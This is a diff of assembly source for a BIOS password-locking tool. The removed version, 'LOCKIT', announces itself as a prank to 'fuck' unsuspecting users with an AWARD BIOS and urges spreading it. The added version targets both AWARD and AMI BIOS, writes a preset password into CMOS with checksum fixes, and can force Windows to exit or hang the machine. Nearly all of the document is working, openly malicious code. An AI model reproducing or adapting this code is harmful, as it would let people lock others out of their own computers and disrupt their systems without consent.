@@ -1,153 +1,176 @@
-; ***************************************************************************
-;        -=x[ LOCKIT ]x=- v1.8
-;
-;  Koded by
-;          -=x[ STaS ]=-
-;                       CopyLeft by SysD Destructive Labs, 1997-1998
-;
-;               Cool software, that fucks any lamah
-;               with any AWARD BIOS.
-;               This programm MUST be distributed freely,
-;               so, send it to ALL your lamah friendz!
-;               If you have any comments for this code,
-;               please send it to me by e-mail: stas@nettaxi.com
-;               or by ICQ: 1124746
-;
-;       ENJOY THIS INCRIBLE FUCKING TOOL!!!!!!!!!!
-;
-;       REMEMBER: A NEW BIOS PASSWORD WILL BE "WHiP_aSS"
-;       DON'T TELL THIS TO LAMAH!
-;
-; ***************************************************************************
+locals
+.286
+.model large, WINDOWS PASCAL
+INCLUDE windows.inc
 
-                        ; * * * * * * * * * * *
-                        ; * LaMMeRZ  ÄÄ :-(  *
-                        ; * CRaCKeRZ ÄÄ :D'  *
-                        ; * * * * * * * * * * *
+EXTRN   InitTask:PROC
+EXTRN   ExitWindows:PROC
 
-MODEL tiny                                      ; Create .COM file...
-.286                                            ; for 286
+; import from CMOS library
+EXTRN   ReadCMOS:PROC
+EXTRN   WriteCMOS:PROC
+EXTRN   ReadCMOSW:PROC
+EXTRN   WriteCMOSW:PROC
+EXTRN   CalculateChecksum:PROC
 
-pwdH    EQU 8Bh                                 ; Here comes the password...
-pwdL    EQU 53h                                 ; ...encrypted, sure!!!
+GLOBAL  SetAWARD:PROC
+GLOBAL  SetAMI:PROC
 
-CODESEG
+.data
 
-        ORG 100h                                ; Jump PSP...
+                DB 16 dup (0)
+
+                DB 00Bh, 0ADh, 05Eh, 0EDh                       ; Config mark
+		DB 2, 0						; Version
+                DB 10                                           ; 10 bytes
+ExitMode        DB 000h                                         ; Normal exit
+AWARD           DB 0E9h, 065h                                   ; Password:
+AMI             DB 0F0h, 03Dh, 0A8h, 0E6h, 078h, 0A3h, 090h     ; "unlock"
+
+.code
 
 Start:
-        mov     ax, 1111h                       ; CMOS function 11h
-        call    ReadCMOS                        ; Read it...
-        or      al, 3                           ; Set: Bit 1=1;  Bit 0=1
-        xchg    al, ah                          ; Now, AL=11h
-        call    WriteCMOS                       ; FUCKKKKK IT!!!!!!
-                                                ; PaSSWoRD enabled!
+        call    InitTask
 
-        mov     al, 1Ch                         ; Now, write it...
-        mov     ah, pwdH                        ; ...on it's CMOS location...
-        call    WriteCMOS
-        inc     al                              ; AL=1Dh => LOW byte
-        mov     ah, pwdL                        ; of password
-        call    WriteCMOS
+        push    48h
+        push    79h
+        call    CalculateChecksum
+        mov     bx, ax
 
-        call    Checksum                        ; CHECKSUM was changed:
-                                                ; so, update it!
+        push    7Ah
+        call    ReadCMOSW
 
-        ret                                     ; RETurn to caller...
-                                                ; Equal to code
-                                                ; /* START CODE
-                                                ; MOV AX, 4C00h
-                                                ; INT 21h
-                                                ; */ END CODE
-                                                ; , but this one looks
-                                                ; much better!
+        cmp     ax, bx
+        jne     Try_AMI
 
-; *************************************************************************
-; * SUBS                                                                  *
-; *************************************************************************
+        call    SetAWARD
+        jmp     short Bye
 
-PROC WriteCMOS
+Try_AMI:
+        push    37h
+        push    3Dh
+        call    CalculateChecksum
+        mov     bx, ax
 
-; ***********************************************************
-;  WriteCMOS:
-; 
-;   INPUT:
-;        AL=CMOSfunction
-;        AH=Value
-;   OUTPUT:
-;        None
-; ***********************************************************
-
-        push    ax
-        out     70h, al
-        xchg    al, ah
-        out     71h, al
-        pop     ax
-
-        ret
-
-ENDP WriteCMOS
-
-PROC ReadCMOS
-
-; ***********************************************************
-;  ReadCMOS:
-; 
-;   INPUT:
-;        AL=CMOSfunction
-;   OUTPUT:
-;        AL=Value
-; ***********************************************************
-
-        out     70h, al
-        in      al, 71h
-
-        ret
-
-ENDP ReadCMOS
-
-PROC Checksum
-
-; ***********************************************************
-;  Checksum:
-; 
-;   INPUT:
-;        None
-;   OUTPUT:
-;        None
-; ***********************************************************
-
-        push    ax
-        push    bx
-        push    cx
-
-        xor     ax, ax
-        xor     bx, bx
-        mov     cx, 10h
-
-        jmp     short CheckEnd
-Looping:
-        mov     al, cl
-        call    ReadCMOS
+        push    40h
+        push    7Ch
+        call    CalculateChecksum
         add     bx, ax
-        inc     cl
-CheckEnd:
-        cmp     cl, 2Dh
-        jle     short Looping
 
-        mov     al, 2Eh
-        mov     ah, bh
-        call    WriteCMOS
-        inc     al
-        mov     ah, bl
+        push    3Eh
+        call    ReadCMOSW
+
+        cmp     ax, bx
+        jne     Bye
+
+        call    SetAMI
+
+Bye:
+        cmp     [ExitMode], 1
+        jz      KillWindows
+        cmp     [ExitMode], 2
+        jz      HangWindows
+
+Exit:
+        mov     ax, 4C00h
+        int     21h
+
+KillWindows:
+	push	0
+	push	0
+	push	0
+	call	ExitWindows
+        jmp     short Exit
+
+HangWindows:
+        cli
+        jmp     short HangWindows
+
+
+;*************************************
+; Password storage routines
+;*************************************
+SetAWARD PROC PASCAL
+        USES    ax
+
+	push	11h
+	call	ReadCMOS
+
+	or      al, 3
+
+	push	11h
+	push	ax
+	call	WriteCMOS
+
+        push    1Ch
+        push    [WORD PTR AWARD+0]
         call    WriteCMOS
 
-        pop     cx
-        pop     bx
-        pop     ax
+        push    1Dh
+        push    [WORD PTR AWARD+1]
+        call    WriteCMOS
+
+        push    10h
+        push    2Dh
+        call    CalculateChecksum
+
+        push    2Eh
+        push    ax
+        call    WriteCMOSW
 
         ret
+ENDP SetAWARD
 
-ENDP Checksum
+
+SetAMI PROC PASCAL
+        USES    ax, bx, si, di
+
+        push    29h
+	call	ReadCMOS
+
+        or      al, 10h
+
+        push    29h
+	push	ax
+	call	WriteCMOS
+
+        push    10h
+        push    2Dh
+        call    CalculateChecksum
+
+        push    2Eh
+        push    ax
+        call    WriteCMOSW
+
+        mov     di, 37h
+        mov     si, offset AMI
+
+Send:
+        push    di
+        push    [si]
+        call    WriteCMOS
+
+        inc     si
+        inc     di
+
+        cmp     di, 3Dh
+        jle     short Send
+
+        push    37h
+        push    3Dh
+        call    CalculateChecksum
+        mov     bx, ax
+
+        push    40h
+        push    7Ch
+        call    CalculateChecksum
+        add     ax, bx
+
+        push    3Eh
+        push    ax
+        call    WriteCMOSW
+
+        ret
+ENDP SetAMI
 
 END Start
